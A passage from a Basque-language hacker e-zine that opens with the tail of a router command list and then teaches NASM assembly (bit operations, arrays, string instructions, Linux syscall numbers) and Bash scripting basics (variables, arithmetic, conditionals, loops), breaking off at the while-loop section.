#configure : konfigurazio moduan sartzeko
#clock: erlojuaren ordua ezartzeko
#debug : arazketa martxan jartzeko
#undebug arazketak kentzeko
#elog : gertaeren berri edukitzeko
#erase : sistema fitxategi bat ezabatu.
#write : momentuko konfigurazioa gordetzeko
#systat : sisteman konektatuta daudenak ikusteko
#verify : fitxategiak egiaztatzeko
#archive : tar fitxategien edukina ikusteko ala irekitzeko
#terminal : pantailaren ezaugarriak aldatzeko
#send : mezuak bidaltzeko
#banner : sistema mezuak aldatzeko (login egiterakoan, e.a.)
#prompt : agindu prompt-a aldatzeko


             -keepalive-
</0x06>





<0x07>

                       NASM programazio lengoaia
                 _______________________________________

Agurrak guzt101

NASM lengoaiari bagiratu bat ematen jarraitzen dugu. Aurreko alean eragiketa aritmetikoak, funtzioak,
kanpo fitxategiak gehitzen e.a ikusi genuen. Oraingoan bit eragiketak aztertuko ditugu, besteak beste.

Bit eragiketak
--------------

Zertarako bit eragiketak? eragiketa logikoetaz gain (AND, OR, XOR,..) eragiketa aritmetiko azkarrak sortzeko
balio dute. Bit desplazamendua adibidez, biderkaketa/zatiketa baten berdina da.

-Adibidez: desplazamendua ezkerretara
 01001011 -> 10010110   
Zenbaki desplazatzen denean, 0ak sartzen dira. Oinarri bitarran x2 egitearen baliokidea da!
 75 -> 150

Desplazamendua eskuinera, birritan
 01001011 -> 00010010
Oinarri bitarran /4 egitean baliokidea (bi aldiz /2 )
 75 -> 18

Ohizkoa den moduan, azalpenak kode adibide batekin emanen ditugu.

------------------------8<----------------------------------------------------------
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; biteragiketak.asm
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; $Id$
; Mihiztadura lengoaiako adibidea, bit eragiketak aztertzeko
; NASMrako egina. NHTaldea - Jakin 7

; konpilazioa:
;    nasm -f elf biteragiketak.asm
; estekaketa:
;    gcc -g -o biteragiketak biteragiketak.o


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
SECTION .data  ; Datu segmentua, hasieratutako datuak
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
zenbaki1:       dd      29AH           ; Zenbaki osoa = 666 oinarri hamaseitarran
zenbaki2:	dd	14o            ; Zenbaki osoa oinarri zortzitarran (12)
zenbaki3:       dd      23AH	       ; Zenbaki osoa
zenbaki4:       db      10011101b      ; Zebanki osoa oinarri bitarran

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
SECTION .bss  ; bss segmentua, hasieratu GABE dauden datuak
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
emaitza: resd 1     ; emaitza aldagaia erreserbatzen da, hitz bikoitzeko tamainakin

	
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
SECTION .text  ; Kode segmentua
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


section .text
        global main          ; Hasieran jarri behar den etiketa

main:
         ;; Desplazamenduak: shl eta shr
         mov eax, [zenbaki4]  ; EAX = 10011101b
         shl eax, 1           ; EAX = 00111010b Desplazamendua ezkerretara
         shr eax, 2           ; EAX = 2 desplazamendu eskuinera
         mov eax, [zenbaki1]  ; EAX = 29AH
         mov cl, 2            ; DL  = 2  
         shl eax, cl          ; EAX =  2 Desplazamendu ezkerretarea
        
         ;; Desplazamendu aritmetikoak: sal eta sar
         ;; Desplazemendu hauek ZEINUA bita hartzen dute kontutan!!
 	 mov eax, [zenbaki2]   ; EAX = 14o
         sal eax, 1            ; EAX shl-ren berdina, zeinua aldatzen ez delako.
         mov eax, 11101101b    ; EAX = 11101101b
         sar eax, 1            ; EAX = 11110110b Desplazamenduan zeinu bita mantentzen da!

        ;; Errotazioa: rol eta ror
        ;; Errotazioan desplazamenduan alde batetik desagertutako bitak
        ;; bestaldetik sartzen dira
        mov eax, 10110011b     ; EAX = 10110011b
        rol eax, 2             ; EAX = 11001110b
        ror eax, 1             ; EAX = 01100111b

        ;; Errotazioa Carry Flag ta guzti: rcl eta rcr
        mov eax, 10001101b     ; EAX = 10001101b
        clc                    ; Carry Flag 0n jartzen da (CF = 0)
        rcl eax, 1             ; EAX = 00011011b
        rcr eax, 1             ; EAX = 10001101b

        ;; Eragiketa LOGIKOAK: AND, OR, XOR, NOT eta TEST
        mov eax, 10101101b     ; EAX = 10101101b
        mov ebx, 11010111b     ; EBX = 11010111b
        and eax, ebx           ; EAX = EAX & EBX
        and eax, eax           ; EAX = EAX & EAX
        ;; XOR
        mov eax, [zenbaki1]    ; EAX = 29AH
        xor eax, eax           ; EAX = dena 0 izanen da. Hasieraketa metodo ezaguna da.
        ;; NOT
        not eax                ; EAX = dena 1
        mov ebx, [zenbaki1]    ; EBX = 29AH
        xor ebx, ebx           ; EBX = dena 0
        ;; OR
        or eax, ebx            ; EAX = dena 1

        ;; TEST : AND bat egitun du baina emaitza gorde gabe: FLAGak aldatzen ditu
        mov eax, 10101101b     ; EAX = 10101101b
        mov ebx, 11010111b     ; EBX = 11010111b
        test eax, ebx          ; EAX & EBX, emaitza 0 bada ZF = 1


        ;; Irteera
					; exit sistema deia erabili ordez
					; return 0 bat egiten dugu
        mov     eax, 0			; kodea esleitzen zaio AXi = 0
        ret				; RETURN

----------------------8<------------------------------------------------------------

Bektoreak
--------------

Bektoreak, arraiak, nahi duzuean moduan. NASMk aukera ematen digu egitura hauek
erabiltzeko. Beti bezala adibide baten bitartez ikusiko dugu. Adibidean bektoreen
definizioa eta erabilera erakutsiko da.

------------------------8<----------------------------------------------------------
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; bektoreak.asm
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; $Id$
; Mihiztadura lengoaiako adibidea, bektoreak aztertzeko
; NASMrako egina. NHTaldea - Jakin 7

; konpilazioa:
;    nasm -f elf bektoreak.asm
; estekaketa:
;    gcc -g -o bektoreak bektoreak.o


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
SECTION .data  ; Datu segmentua, hasieratutako datuak
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

bektore1:       db  0, 0, 0, 0, 0, 0, 0, 0, 0, 0      ; 10 0z osatutako bektorea
bektore2:       times 10 dw  0                        ; BERDINA! hitz tamainarekin
bektore3:       dd  21, 22, 23, 25, 53, 69, 80        ; 7 elementutako bektorea
bektore4:       dd  'J','a','k','i','n'               ; 5 elementutako bektorea

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
SECTION .bss  ; bss segmentua, hasieratu GABE dauden datuak
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
bssbektore1     resd 10      ; hasieratu gabeko 10 elementuko bektorea
bssbektore2     resd 200     ; hasieratu gabeko 200 elementuko bektorea
bssbektore3     resb 10      ; hasieratu gabeko 10 elementuko bektorea



;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
SECTION .text  ; Kode segmentua
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

section .text

        global main          ; Hasieran jarri behar den etiketa
main:
         ;; Bektorearen balioak atzitzeko hasiera helbideari desplazamendua
         ;; gehitu behar zaio, baino kontuz! Desplazamendua aldatzen da
         ;; Elementu motaren arabera: 
         ;; db = +1
         ;; dw = +2
         ;; dd = +4
         ;; ARGI IBILI. 

         ;; bektore1 db : elementuek byte tamaina dute

         mov al, [bektore1]     ; AL = bektore1[0]
         mov bl, [bektore1 + 1] ; AL = bektore1[1]
         mov byte [bektore1 + 3], 4   ; bektore[3] = 4

         ;; bektore2 dw: elementuek hitz tamaina dute
         mov ax, [bektore2]     ; AX = bektore2[0]
         mov bx, [bektore2 + 2] ; BX = bektore2[1]
         mov cx, [bektore2 + 8] ; CX = bektore2[4]

         ;; Goazen bektore1-i balioak 0tik 7ra aldatzera
         mov ebx, bektore1      ; EBX = *bektore1 (memoria gunea, ez balioa)
         mov ecx, 10            ; ECX = 10 bektore kontagailua
segi:    mov byte [ebx], 7      ; bektore[x] = 7
         inc ebx                ; Bektorearen hurrengo elementua
         loop segi              ; ECX != 0 bada, segi.


        ;; Bektore-kate agindu bereziak
        ;; NASM-k zenbait agindu eskeintzen ditu bektoreekin ergiketa
        ;; bereziak egiteko. Agindu horiek erregistroen erabilera inplizitua
        ;; egiten dute. Pentsatu bektore bat beste batean kopiatu nahi dela.
        ;; Iturri bat eta helburu bat egonen da:
        ;; ESI : Source Index, iturri indizea
        ;; EDI : Destination Index, helburuaren indizea
        ;; Helbide FLAG-a: Honek indizeen portaera (inkrementala ala dektrementala)
        ;; adierazten du. FLAG hau ezartzeko bi agindu dauzkagu:
        ;; CLD : clear, indizeak inkrementatuko dira
        ;; SLD : set, indizeak dekrementatuko dira
        ;; EAX : inplizituko erabiliko da datuak mugitzeko

        ;; Adibidea: bektore1 bssbektore3-n kopiatuko da
        cld                    ; indizeak inkrementatuko dira
        mov esi, bektore1      ; ESI = *bektore1   : iturburuaren indizea
        mov edi, bssbektore3   ; EDI = *bssbektore3: helburuaren indizea
        mov ecx, 10            ; ECX = 10 bektore kontagailua
mugi:   lodsb                  ; AL = bektore1[esi]
        stosb                  ; bssbektore3[edi] = AL
        loop mugi              ; ECX != 0 bada, segi.
 
        ;; ADI!! rep aginduarekin aurreko loop hori lerro bakar batean egin
        ;; daiteke. rep aginduak stos, lods motako aginduak nahi adina aldiz
        ;; (ecx-en dagoen balioa) errepika daitezke

        ;; Tamainaren arabera lods eta stos ezberdinak daude:
        ;; LODSB   AL = [DS:ESI]  eta  ESI +- 1 (+- cld ala sld arabera)
        ;; LODSW   AX = [DS:ESI]  eta  ESI +- 2
        ;; LODSD   EAX= [DS:ESI]  eta  ESI +- 4
        ;; STOSB   AL = [DS:EDI]  eta  EDI +- 1 (+- cld ala sld arabera)
        ;; STOSW   AX = [DS:EDI]  eta  EDI +- 2
        ;; STOSD   EAX= [DS:EDI]  eta  EDI +- 4

        ;; MOVS aginduak: LODS+STOS egitearen berdina, EAX ukitu gabe kasu honetan
        ;; MOVSB : byte  [ES:EDI] = byte  [DS:ESI] eta EDI +- 1 eta ESI +- 1
        ;; MOVSW : word  [ES:EDI] = word  [DS:ESI] eta EDI +- 2 eta ESI +- 2
        ;; MOVSD : dword [ES:EDI] = dword [DS:ESI] eta EDI +- 4 eta ESI +- 4
        ;; Aitzineko kasuan
        ;; mugi : movsb
        ;;        loop mugi

        ;; Karaktere kateen konparaketak.
        ;; Kateekin CMP antzeko zerbait erabil daiteke.
        ;; Bi motako aginduak daude:
        ;; CMPS motakoak: konparaketak egiteko ;;
        ;; CMPSB  byte [DS:ESI] <-> byte [ES:EDI] gero ESI +- 1 eta EDI +- 1
        ;; CMPSB  word [DS:ESI] <-> word [ES:EDI] gero ESI +- 2 eta EDI +- 2
        ;; CMPSB  dword [DS:ESI] <-> dword [ES:EDI] gero ESI +- 4 eta EDI +- 4
        ;; SCAS motakoak: bilaketa zehatzak egiteko ;;
        ;; SCASB: AL <-> [ES:EDI] gero EDI +- 1

        ;; SCASB: AX <-> [ES:EDI] gero EDI +- 2

        ;; SCASB: EAX <-> [ES:EDI] gero EDI +- 4

        ;; Adibidez, bilatu 53 zenbakia array batean
        cld                    ; indizeak inkrementatuko dira
        mov edi, bektore3      ; EDI = bektore3: helburuaren indizea
        mov eax, 53            ; EAX = bilatu behar dugun balioa

        mov ecx, 7             ; ECX = 7 bektore kontagailua
bilatu: scasd                  ; EAX =?= [ES:EDI]
        je topatua             ; FLAGak begiratu eta topatu den ala ez ikusi
        loop bilatu            ; segi bilatzen eta ECX--
        jmp aurrera            ; ez bada ezer topatzen segi

topatua:sub edi, 4            ; EDI = EDI - 4 posizio egokira apuntatzeko.
aurrera:

        ;; Konparaketen kasurako REP estiloko aginduak ere erabil daitezke:
        ;; REPE, REPZ, REPNE, REPNZ

        ;; Irteera
					; exit sistema deia erabili ordez
					; return 0 bat egiten dugu
        mov     eax, 0			; kodea esleitzen zaio AXi = 0
        ret

----------------------8<------------------------------------------------------------

Bueno. Memoria posiziotan mugitzen diren balioak ikusteko erabili gb debuggerra edo nahiago
duzuen sistema.

NASMren oinarriak azaltzea pisutsu xamarra egiten dela argi dago. Baina Jakin e-zinearen
printzipioei atxekituz, gauza zailagoetan muturra sartu baino lehen oinarri sendo bat
(background deituiozue :>) ezartzea komeni da.

Asuntu gehiago geratzen dira, adibidez zenbaki errealen erabilera. Baina hori beste ale
baterako utziko dugu.  Aitzineko alean sistema deiak aipatu genituen artikuluaren bukaera
aldera. Horixe da bidea mihiztadura lengoaiari etekina ateratzeko!!


Sistema deiak: linux
--------------------

Mihiztadura lengoaiaren oinarriak ezagutzen ditugu jada. Aldagaiak, bektoreak, funtzio
deiak eta fitxategi laguntzaileak erabiltzen dakigu. Zer eskeintzen digu kernelak?

Linux sistema eragilean kokatuko gara lehenbizi. Aurreko NASM artikuluetan zenbait sistema
dei agertu dira, exit eta write kasu. Baina nola jakin dezakegu, modu azkar batean, ze
sistema dei dauzkagun?
Begirada bat bota /usr/include iturburu fitxategietan.
syscall.h-tik ->sys/syscal.h eta -> asm/unistd.h -ra heltzen gara eta HARA! hortxe sistema deiak
dagokien kodearekin.

Orain sistema deiak burutzeko datu bat ezagutzen dugu: sistema deiaren kodea. Gero
sistema dei bakoitzak behar dituen parametroak pasatzen ikasi beharko dugu.

/*
 * This file contains the system call numbers.
 */

#define __NR_restart_syscall      0
#define __NR_exit		  1
#define __NR_fork		  2
#define __NR_read		  3
#define __NR_write		  4
#define __NR_open		  5
#define __NR_close		  6
#define __NR_waitpid		  7
#define __NR_creat		  8
#define __NR_link		  9
#define __NR_unlink		 10
#define __NR_execve		 11
#define __NR_chdir		 12
#define __NR_time		 13
#define __NR_mknod		 14
#define __NR_chmod		 15
#define __NR_lchown		 16
#define __NR_break		 17
#define __NR_oldstat		 18
#define __NR_lseek		 19
#define __NR_getpid		 20
...

Dei  bakoitzak behar dituen parametroak eta bestelako xehetasunak ezagutzeko linuxeko
manuala erabil daiteke. Sistema deiak, bertze programazio adibideak bezalaxe man orrietan
aurki daitezke:

linuz# man 2 write



             -napharhack-

</0x07>





<0x08>
                       BASH scripting
                      ________________ 



Agur eta ohore Euskalerria.
Askoren ustez Linux sistema ez da batere erabilgarria eta zailtasun handiak ikusten
dituzte bere fitxategi eta prozesuen artean mugitzeko. Agian ez dira ohartu bash
izeneko agindu interpretatzaile baten gainean daudela.


Bash scriptak testu fitxategiak dira non linux aginduak bata bestearen
atzean sartzen diren (batch prozesu fitxategiak dira azken finean). Baina
bash-en kasuan programazio lengoai baten aukera daukagu: aldagaiak, kontrol-egiturak,
begiztak, funtzioak, e.a.. sar daitezke.

Horrekin BASHek botere amaitezina ematen digu! 

Erreferentzia bezala balio dezakeen artikulu honetan BASHen ezaugarri esanguratsuenak
aurkeztuko dira. Irakurri baino, kodea kopiatu, egikaritu eta moldatu zure gustora.
Horrela ikasten baita.

+-----------+ 
| ITSURA    |
+-----------+

Goazen lehen adibidearekin. Honek aldagai bat definitu eta irteera standarretik
ateratzen du mezu batekin batera.

OHARRA: script hauek egikaritzeko ezinbestekoa da egikaritzapen baimena eukitzea:
jakin# chmod +x kaixo.sh
edo
jakin# chmod 700 kaixo.sh

-------------------------------8<----------------------------------------------
#!/bin/sh

# kaixo.sh - Espoz&Mina - Jakin ezine 7
# mezu bat pantailaratzen du.

# Hau iruzkin bat da.

# Scriptak azken fineak unix aginduak jarraian egikaritzeko
# prestatzen diren fitxategiak dira.

# Kasu honetan aldagai bat definitu eta pantailaratzen da.
# Gero $ALDAGAIA edo ${ALDAGAIA} jarrita atzituko da
ALDAGAIA="kaixo mundua"

# mezuak pantailatik ateratzeko echo erabiltzen da
# echo -n jartzen bada ez da lerro saltorik gehituko

echo -n "Espoz&Minak dio: "

echo "${ALDAGAIA}"
----------------------------8<-------------------------------------------------

+-----------+ 
| ALDAGAIAK |
+-----------+

BASH ez dauka datu mota definitzerik eta aldagaiak sortzea oso xinplea da.
Nahi dugun edukina sar dezakegu (katea, zenbakia, e.a.)

Adibide honetan gauza interesgarri asko ikus daitezke: scriptari pasatutako argumentuen
kudeaketa, arrayen erabilera, etabar.

-------------------------------8<----------------------------------------------
#!/bin/sh

# aldagaiak.sh - Espoz&Mina - Jakin ezine 7
# Aldagaien erabilera aurkezten da

# scriptek ez daukate inongo aldagai "motarik"

# aldagai definizioa
aldagai_bat=31337
IZENAK="Regexp Espoz&Mina niuBAI edit keepalive assert"
NIRE_IZENA="Espoz&Mina"
BOOLEARRA=true

echo "Goazen aldagaiak ikustera: "
echo "Zenbaki bat: ${aldagai_bat}"
echo "Izen talde bat: ${IZENAK}"
echo "Izen bat ${NIRE_IZENA}"

# Scriptari pasatzen zaizkion aldagaiak jasotzen al dira?
# bai noski : ${zenbakia} non:
# ${0} : scriptaren izena
# ${1} : lehen aldagaia
# ${2} : bigarren aldagaia
# ...e.a.
echo "${0} eta ${1} "
# Bestelako aldagai bereziak:
# $# : scriptarik pasatutako arg. kopurua
echo "Pasatutako parametro kopurua: $#"
# $@ : scriptaren parametro taldea
echo IDa: ${!} eta $@

#############################################################
# Arraiak: dimentsio bakarreko bektoreak sor daitezke
#############################################################
adiskideak[0]="niuBAI"
adiskideak[1]="Regexp"
adiskideak[2]="NapharHack"
adiskideak[3]="edit"

# Beste modu bat
ETSAIAK=("$GAE" "OPU$" "RIAA" "NSA" "CNI" "Carlos Mesa xD" )
Zenbakiak=(23 45 65 23 456 23 234 45)

echo ${adiskideak[0]} adiskide bat da, ${ETSAIAK[1]} ordea etsaia
#echo "Tamaina: ${#@{adiskideak}} 
#echo "Tamaina: ${#${etsaiak}}

#############################################################
# Ingurune aldagaiak jaso daitezke:
#############################################################
echo "Momentuko direktorioa: ${PWD} eta erabiltzailea: ${UID}"

# Nola jakin ze aldagai dauzkagun sisteman?
# set egindua egikaritu eta momentuko aldagaiak ikusi ahal izango dira
# bestela hona aldagaien zerrenda

#############################################################
# Aldagaiekin jolasten:
#############################################################
# Aldagaiaren balio bat lortu -substring-
IZENA="Jakin Ezine 7"
echo ${IZENA} zati bat ${IZENA:5} eta beste bat ${IZENA:5:6}

# Balioak besterik ezean.
# Aldagai bat ez da definitu edo ez dauka baliorik?
# Lasai, hori sahiesteko moduak daude:

# ${aldagaia:-besterik-ezeko-balioa}
# aldagaia definitu gabe balndinbadago besterik ezeko
# balioa erabiltzen da.
BALIOGABE=
echo "BALIOGABE aldagaia: ${BALIOGABE:-31337} eta ${HUTSA:-'Mikel Perez'}"
echo "BALIOGABE aldagaiak ${BALIOGABE} ez dauka baliorik"

#${aldagaia:=besterik-ezeko-balioa}
# berdin, baina kasu honetan besterik-ezeko-balioa
# aldagaian ezartzen da!
echo "BALIOGABE aldagaia ${BALIOGABE:=31337} etc ${BERRIA:='P0wah'}"
echo "Orain bai: ${BALIOGABE} eta ${BERRIA}"

#${aldagaia:+besterik-ezeko-balioa}
# Alderantziz: Aldagaia definitu gabe edo hutsa denean ez da ezer egiten,
# bestela besterik-ezeko-balioa esleituko zaio.
EPA='sniffit'
echo "EPA-ren balioa: ${EPA:+'tcpdump'} eta gero ${EPA}"

#${aldagaia:?besterik-ezeko-balioa}
# Aldagaia definitu gabe edo hutsa denean errorea pantailaratuko da,
# bestela besterik-ezeko-balioa esleituko zaio.
echo "EHAK-ren balioa: ${EHAK:?'nekane'} eta gero ${EHAK}"

# Aurreratuak:
# ${!aurrizkia*} : aurrikiarekin hasten diren aldagaien zerrenda
# ematen digu. Egizu proba bash-en: for i in ${!P*};do echo $i ;done
----------------------------8<-------------------------------------------------

+------------+ 
| ERAGIKETAK |
+------------+

Zer nolako eragiketak burutu daitezke aldagaiekin?
Kode honetan zenbait adibide -oso xinple- aurkezten dira. C estiloko
eragileak erabiltzen dira azken finean.

-------------------------------8<----------------------------------------------
#!/bin/sh

# eragiketak.sh - Espoz&Mina - Jakin ezine 7
# Aldagaiekin egin daitezkeen oinarrizko eragitak

# probak egiteko aldagaiak
BALIO1=23
BALIO2=45

# Eragiketa aritmetikoak burutzeko expr agindua erabili daiteke edo []

# Zenbakien eragiketak: betikoak dira
# -, +, *, /, %, **, aldagai++, aldagai--, --aldagai, ++aldagai
# == : berdintasuna
# != : ezberdintasuna 


EMAITZA=`expr ${BALIO1} + ${BALIO2}`
echo "Emaitza: ${EMAITZA}"

EMAITZA=`expr ${BALIO1} + ${BALIO2} + 3`
echo "Emaitza: ${EMAITZA}"


# Dena den expr tresna ahula (edo alua xD) da, ezin zaio asko eskatu
# espresio konplexuak sortzeko

BALIO1=0
BALIO2=4
echo "${BALIO1} eta ${BALIO2}"

EMAITZA=$[${BALIO1} + ${BALIO2} + 2]
echo "Orain: ${BALIO1} + ${BALIO2} + 2 = ${EMAITZA}"


BALIO1=$[${BALIO1} + $[${BALIO2} * 3]]
echo "Orain: ${BALIO1} eta ${BALIO2}"


# Eragiketa logikoak, baldintza konplexuak sortzeko aproposak
#  && : and 
#  || : or 
#  !  : not
boolearra=true

# Boolearra true bada pantailatik OK ikusiko dugu, bestela "ez OK"
$boolearra && echo "OK" || echo "ez OK"

# Aginduak ongi egikaritzen diren ala ikusteko erabil daiteke
# adibidez: make && echo OK
# baita aginduak kateatzeko (agindu guztiak ongi egikarituko dira
# guztiak ongi atera baldinbadira), adibidez, 2.4 kernela konpilatzerakoan:
# make dep && make bzImage && make modules && make modules_install && echo OK
# Azkenean OK ikusten badugu esan nahi du pausu guztiak ONGI egikaritu direla
ps -axf && echo "OK"

# Eragiketak Bitekin, gutxi erabiliko direnak
#  & : AND bitekin
#  | : OR bitekin
#  ~  : NOT bitekin 
#  ^  : XOR bitekin 
#  << : desplazamendua ezkerretara
#  >> : desplazamendua eskuinera

# konparaketak: <= >= < >       

#  Esleipen arrunta 
# = :a=b  a-ri b esleitzen zaio

# Esleipen laburtuak
# a+=b  : a = a + b 
# a-=b  : a = a - b 
# a*=b  : a = a * b 
# a/=b  : a = a / b 
# a%=b  : a = a % b 
# a&=b  : a = a & b 
# a^=b  : a = a ^ b 
# a|=b  : a = a ! b 
# a<<=b : a = a << b 
# a>>=b : a = a >> b 

#       expr?expr:expr


----------------------------8<-------------------------------------------------

+------------------+ 
| KONTROL EGITURAK |
+------------------+

Hara! hauek bai interesgarriak. BASH scripteten if-then-else eta bestelako
baldintza-kontrol egiturak sor daitezke. Oinarrizko konparaketetaz gain
(zenbakiak, kateak), fitxategiekin egin daitezkeen baldintzak baditugu.

-------------------------------8<----------------------------------------------
#!/bin/sh

# kontrolegiturak.sh - Espoz&Mina - Jakin ezine 7
# Oinarrizko kontrol egiturak aurkezten ditu

IZENAK="Regexp Espoz&Mina niuBAI edit keepalive assert"

###########################################
## IF egitura
# if  baldintza
# then
#    eragiketa
# fi
###########################################

ALDAGAIA=45

if [ ${ALDAGAIA} -gt 0 ]; then
 echo "${ALDAGAIA} 0 baino handiagoa da"
fi

# then hurrengo lerroan sar daiteke
if [ -e /etc/shadow ]
then
    echo "OK, shadow pasahitza sistema daukazula dirudi"
fi

###########################################
## IF-ELSE egitura
# if  baldintza
# then
#    eragiketa
# else
#    eragiketa 
# fi
###########################################

ALDAGAIA=-23

if [ ${ALDAGAIA} -lt 0 ]
then
 echo "${ALDAGAIA} 0 baino txikiagoa da"
else
 echo "${ALDAGAIA} 0 baino handiagoa da";
fi

###########################################
## IF-ELSIF egitura
# if  baldintza1
# then
#    eragiketa
# elif  baldintza2
# then
#    eragiketa 
# elif  baldintza3
# then
#    eragiketa 
# else
#    eragiketa 
# fi
###########################################


# Hurrengo adibiderako S/I eragiketa oinarrizko bat darabilgu: read
# read aldagaia
# sarrera stdetik sartutako aldagaian gordetzen da;

echo -n "Sartu balio bat:"
read BALIO1
echo -n "OK Sartu beste balio bat:"
read BALIO2

echo "Sartutako balioak ${BALIO1} eta ${BALIO2} dira"

if [ ${BALIO1} -gt ${BALIO2} ]
then
   echo "${BALIO1} ${BALIO2} baino handiagoa da"
elif [ ${BALIO1} -lt ${BALIO2} ]
then
   echo "${BALIO1} ${BALIO2} baino txikiagoa da"
else
   echo "${BALIO1} eta ${BALIO2} berdinak dira"
fi

###########################################
## TEST egitura
# test  baldintza || eragiketa
# test  baldintza && eragiketa
###########################################

###########################################
## CASE egitura
# case aldagaia
#  balio1)
#    eragiketa
#	;;
#  balio2)
#    eragiketa
#	;;
#  balio3)
#    eragiketa
#	;;
#  *)
#    eragiketa
#	;;
# esac
###########################################

IZENA=""

echo -n "Eman izen bat:"
read IZENA

case ${IZENA} in
  txipi)
      echo "${IZENA}> Hitzaldiak musutruk ematen ditut"
      ;;
  bixen)
      echo "${IZENA}> BSD zalea naiz"
      ;;
  osoitz)
      echo "${IZENA}> Marrapuntu montatu nahi dut"
      ;;
  patxangas)
      echo "${IZENA}> Literatur zalea naiz"
      ;;
   *)
      echo "Ez dut ${IZENA} ezagutzen"
esac

###############################################################3
# baldintzen erreferentzia 
###############################################################3

## Baldintza testak fitxategiekin ##
#  -a fitxategia : Egia fitxategia existitzen bada.
#  -e fitxategia : berdina
#  -b fitxategia : Egia fitxategia existitzen bada eta fitxategiak blokeo berezia badu.
#  -c fitxategia : Egia fitxategia existitzen bada eta fitxategia karaktere motakoa (/dev dispositiboak normalean).
#  -d fitxategia : Egia fitxategia existitzen bada eta direktorioa bada
#  -f fitxategia : Egia fitxategia existitzen bada eta fitxategi arrunta da.
#  -g fitxategia : Egia fitxategia existitzen bada eta set-group-id bada.
#  -h fitxategia : Egia fitxategia existitzen bada eta esteka sinbolikoa bada.
#  -k fitxategia : Egia fitxategia existitzen bada eta sticky-bita ezarria dauak
#  -p fitxategia : Egia fitxategia existitzen bada eta izendun tuberia da
#  -r fitxategia : Egia fitxategia existitzen bada eta irakurgarria da.
#  -s fitxategia : Egia fitxategia existitzen bada eta eta 0 baino handiagoa bada
#  -u fitxategia : Egia fitxategia existitzen bada eta setUID bita ezarria dago.
#  -w fitxategia : Egia fitxategia existitzen bada eta irakurgarria da.
#  -x fitxategia : Egia fitxategia existitzen bada eta egikarigarria da.
#  -O fitxategia : Egia fitxategia existitzen bada eta EUIDrena (gure erabiltzailearena) da.
#  -G fitxategia : Egia fitxategia existitzen bada eta EGIDrena (gure taldearena) da.
#  -L fitxategia : Egia fitxategia existitzen bada eta esteka sinbolikoa da.
#  -S fitxategia : Egia fitxategia existitzen bada eta socketa da.
#  -N fitxategia : Egia fitxategia existitzen bada eta azken irakurketaren ostean aldata bada.
#  -t fitxategi-desk : Egia fitxategia deskribatzaile irekia eta terminal bat bada


# fitxategia1 -nt fitxategia2 : Egia fitxategia1 fitxategia2 baino berriago, edo
#                               fitxategia1 existitzen bada eta bestea ez.
# fitxategia1 -ot fitxategia2 : Egia fitxategia1 fitxategia2 baino zaharrago, edo
#                               fitxategia2 existitzen bada eta bestea ez.
# fitxategia1 -ef fitxategia2 : Egia biak inodo zenbaki eta dispositibo bera badira.


## Bestelako testak: ##
# Kateak
# -z katea : Egia katearen luzera 0 bada
# -n katea : Egia katearen luzera 0ren ezberdina bada
# katea == katea : Egia bi kateak berdinak baldin badira
# kate1 != kate2 : Egia bi kateak ezberdinak baldinbadira
# kate1 < kate2  : Egia kate1 lexikoki lehenago baldinbadago
# kate1 > kate2 : Egia kate1 lexikoki kate2-ren ondoren baldinbadago
----------------------------8<-------------------------------------------------

+----------+ 
| BEGIZTAK |
+----------+

Bai noski! begiztak sortzeko aukera badaukagu, ohizko erara: for, while, until,...
for-aren egitura bereziki oso erabilgarria da sysadmin-en lan neketsuak xamurtzeko.

-------------------------------8<----------------------------------------------
#!/bin/sh

# begiztak.sh - Espoz&Mina - Jakin ezine 7
# Begiztak egiteko moduak aurkezten ditu

IZENAK="Regexp Espoz&Mina niuBAI edit keepalive assert"

###########################################
## FOR egitura 1
# for aldagaia in balio1 balio2 .. balioN
# do
#    eragiketa
# done
###########################################

echo "FOR modu xinplean -------"
# modu xinplea
for i in a b c d e f g h i
do
 echo  "hizkia: $i"
done

# Beste adibide bat, aldagaia erabiliaz:
echo "FOR modu xinplean aldagaiekin -------"
echo "Jakin ezinearen idazleak: "

# Kasu honetan hutsunez bereiztutako arraia pasatzen zaio
for i in ${IZENAK}
do
	echo ${i}
done

# scriptari pasatutako parametroak pantailaratu
echo "FOR modu xinplean scriptaren parametroekin-------"
echo "Parametroak "
for i in ${@}
do
	echo ${i}
done

###########################################
## FOR egitura 2 , klasikoa!
# for (hasieraketa ; baldintza ; balioaldaketa)
# do
#    eragiketa
# done
###########################################
# Oharra: hasieraketak eta balioaldaketa moduak
# eragiketen atalean ikus daitezke
echo "FOR egitura klasikoarekin -------"

for (( kont=0 ; ${kont} < 10 ; kont=`expr $kont + 1` ))
do
	echo "Orain> ${kont}"
done

###########################################
## WHILE egitura 
# while baldintza
# do
#    eragiketa
# done
###########################################
echo "WHILE egitura -------"

